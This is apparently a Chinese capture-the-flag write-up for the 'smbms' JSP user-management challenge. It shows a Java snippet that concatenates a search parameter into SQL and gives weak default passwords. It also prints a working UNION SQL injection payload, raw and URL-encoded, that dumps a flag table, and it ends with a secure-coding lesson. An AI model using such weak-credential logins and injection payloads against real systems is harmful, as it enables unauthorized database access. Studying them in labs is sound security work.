# smbms

## 题目简述

这是一个 JSP、Servlet 与 JDBC 组成的用户管理系统。大部分查询使用 `PreparedStatement`，但用户列表搜索把 `userName` 先拼进 SQL 字符串，再交给数据库执行；预编译接口并不能修复已经完成的字符串拼接。利用弱口令登录后，可在该搜索参数上做 UNION 注入读取 `flag` 表。

## 解题过程

登录处使用参数绑定，没有直接注入点；源码和提示中的 `weak_auth` 表明应走弱口令。管理员密码为 `1234567`，普通用户密码为 `0000000`，且登录后的功能缺少严格权限隔离，任取一个可用账号即可进入用户列表。

审计 `getUserList` 时可见：

```java
if (!StringUtils.isNullOrEmpty(userName)) {
    sql.append(" and u.userName like '%")
       .append(userName)
       .append("%'");
}
```

问题发生在 `PreparedStatement` 创建之前：攻击者输入已经成为 SQL 语法的一部分。根据源码或 `ORDER BY` 测试可知原查询有 14 列，页面可显示 UNION 结果的第 3 列。解码后的核心输入为：

```sql
李%' UNION SELECT 1,1,GROUP_CONCAT(flag),4,5,6,7,8,9,1,1,1,1,1
FROM flag WHERE '1' LIKE '%1
```

应用会在末尾继续拼接 `%'`，从而把最后一段闭合成 `WHERE '1' LIKE '%1%'`。放入查询参数时，字面百分号要 URL 编码为 `%25`：

```text
queryName=李%25%27%20union%20select%201%2C1%2Cgroup_concat(flag)%2C4%2C5%2C6%2C7%2C8%2C9%2C1%2C1%2C1%2C1%2C1%20from%20flag%20where%20%271%27like%27%251
```

其余参数保持正常，例如 `method=query`、`queryUserRole=0`、`pageIndex=1`。请求成功后，flag 会出现在用户列表中原本展示用户名的列。

## 方法总结

“项目使用 PreparedStatement”不等于“项目没有 SQL 注入”。只有把不可信值作为占位符参数绑定才安全；若先用 `append()`、格式化字符串或拼接构造 SQL，后续再放进 PreparedStatement 仍然可注入。审计时应追踪 SQL 文本的构造过程，而不是只搜索最终调用的 API 名称。
